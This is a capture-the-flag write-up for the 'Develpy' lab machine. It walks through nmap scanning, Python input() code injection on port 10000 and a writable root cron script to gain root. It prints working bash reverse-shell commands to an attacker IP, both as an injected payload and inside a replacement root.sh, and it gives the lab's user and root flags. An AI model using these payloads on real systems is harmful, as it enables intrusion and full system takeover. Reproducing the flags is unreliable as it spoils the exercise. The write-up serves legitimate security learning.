
# CTF Writeup: Develpy

---
## Reconaissance

An initial scan revealed the following running services on the target server.

```
nmap -n -Pn -sS -p- 10.113.152.8         
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-06 16:22 CDT
Nmap scan report for 10.113.152.8
Host is up (0.011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
10000/tcp open  snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 13.30 seconds
```

An more detailled scan revealed information about the running services.

```
nmap -n -Pn -sSCV -p 22,10000 10.113.152.8
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-06 16:22 CDT
Nmap scan report for 10.113.152.8
Host is up (0.011s latency).

PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 78:c4:40:84:f4:42:13:8e:79:f8:6b:e4:6d:bf:d4:46 (RSA)
|   256 25:9d:f3:29:a2:62:4b:24:f2:83:36:cf:a7:75:bb:66 (ECDSA)
|_  256 e7:a0:07:b0:b9:cb:74:e9:d6:16:7d:7a:67:fe:c1:1d (ED25519)
10000/tcp open  snet-sensor-mgmt?
| fingerprint-strings: 
|   GenericLines: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 0
|     SyntaxError: unexpected EOF while parsing
|   GetRequest: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 1, in <module>
|     NameError: name 'GET' is not defined
|   HTTPOptions, RTSPRequest: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 1, in <module>
|     NameError: name 'OPTIONS' is not defined
|   NULL: 
|     Private 0days
|_    Please enther number of exploits to send??:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port10000-TCP:V=7.95%I=7%D=5/6%Time=69FBB130%P=x86_64-pc-linux-gnu%r(NU
SF:LL,48,"\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200days\r\n\r\n\x20
SF:Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20")%r
SF:(GetRequest,136,"\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200days\r
SF:\n\r\n\x20Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\
SF:?:\x20Traceback\x20\(most\x20recent\x20call\x20last\):\r\n\x20\x20File\
SF:x20\"\./exploit\.py\",\x20line\x206,\x20in\x20<module>\r\n\x20\x20\x20\
SF:x20num_exploits\x20=\x20int\(input\('\x20Please\x20enther\x20number\x20
SF:of\x20exploits\x20to\x20send\?\?:\x20'\)\)\r\n\x20\x20File\x20\"<string
SF:>\",\x20line\x201,\x20in\x20<module>\r\nNameError:\x20name\x20'GET'\x20
SF:is\x20not\x20defined\r\n")%r(HTTPOptions,13A,"\r\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20Private\x200days\r\n\r\n\x20Please\x20enther\x20number\x20of
SF:\x20exploits\x20to\x20send\?\?:\x20Traceback\x20\(most\x20recent\x20cal
SF:l\x20last\):\r\n\x20\x20File\x20\"\./exploit\.py\",\x20line\x206,\x20in
SF:\x20<module>\r\n\x20\x20\x20\x20num_exploits\x20=\x20int\(input\('\x20P
SF:lease\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20'\)\)
SF:\r\n\x20\x20File\x20\"<string>\",\x20line\x201,\x20in\x20<module>\r\nNa
SF:meError:\x20name\x20'OPTIONS'\x20is\x20not\x20defined\r\n")%r(RTSPReque
SF:st,13A,"\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200days\r\n\r\n\x2
SF:0Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20Tra
SF:ceback\x20\(most\x20recent\x20call\x20last\):\r\n\x20\x20File\x20\"\./e
SF:xploit\.py\",\x20line\x206,\x20in\x20<module>\r\n\x20\x20\x20\x20num_ex
SF:ploits\x20=\x20int\(input\('\x20Please\x20enther\x20number\x20of\x20exp
SF:loits\x20to\x20send\?\?:\x20'\)\)\r\n\x20\x20File\x20\"<string>\",\x20l
SF:ine\x201,\x20in\x20<module>\r\nNameError:\x20name\x20'OPTIONS'\x20is\x2
SF:0not\x20defined\r\n")%r(GenericLines,13B,"\r\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20Private\x200days\r\n\r\n\x20Please\x20enther\x20number\x20of\x20
SF:exploits\x20to\x20send\?\?:\x20Traceback\x20\(most\x20recent\x20call\x2
SF:0last\):\r\n\x20\x20File\x20\"\./exploit\.py\",\x20line\x206,\x20in\x20
SF:<module>\r\n\x20\x20\x20\x20num_exploits\x20=\x20int\(input\('\x20Pleas
SF:e\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20'\)\)\r\n
SF:\x20\x20File\x20\"<string>\",\x20line\x200\r\n\x20\x20\x20\x20\r\n\x20\
SF:x20\x20\x20\^\r\nSyntaxError:\x20unexpected\x20EOF\x20while\x20parsing\
SF:r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 123.30 seconds
```

I connected to the application on port 10000 using netcat.

```
nc 10.113.152.8 10000

        Private 0days

 Please enther number of exploits to send??: __import__('os').system('id')
uid=1000(king) gid=1000(king) groups=1000(king),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)

Exploit started, attacking target (tryhackme.com)...
```

Since Command Injection is possible, I utilized python functionality with an eval() syntax to get RCE.

```
nc 10.113.152.8 10000

        Private 0days

 Please enther number of exploits to send??: __import__('os').system('/bin/bash -c "bash -i >& /dev/tcp/192.168.227.246/80 0>&1"')
```

Started listener on port 80.

```
nc -lvnp 80
```

Executed the command and gained RCE as user "king".

Retrieved user.txt in /home/king directory.

```
cf85ff769cfaaa721758949bf870b019
```

## Privilege Escalation

I analyzed /etc/crontab and saw that the "root.sh" script inside /home/king is getting executed with root permissions!

```
king@ubuntu:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   king    cd /home/king/ && bash run.sh
*  *    * * *   root    cd /home/king/ && bash root.sh
*  *    * * *   root    cd /root/company && bash run.sh
#include 
```

Since this script is in our directory, in which we got full write permissions, we backed the original script up.

```
mv root.sh root-backup.sh
```

and created an malicious root.sh script.

```
nano root.sh
#!/bin/bash

/bin/bash -c 'bash -i >& /dev/tcp/192.168.227.246/1337 0>&1'
```

Since this new script will get executed automatically, I will be starting up my netcat listener on port 1337.

```
nc -lvnp 1337
```

Gained RCE as user "root" after some time.

```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [192.168.227.246] from (UNKNOWN) [10.113.152.8] 38242
bash: cannot set terminal process group (2559): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:/home/king#
```

Retrieved root.txt in /root directory.

```
9c37646777a53910a347f387dce025ec
```


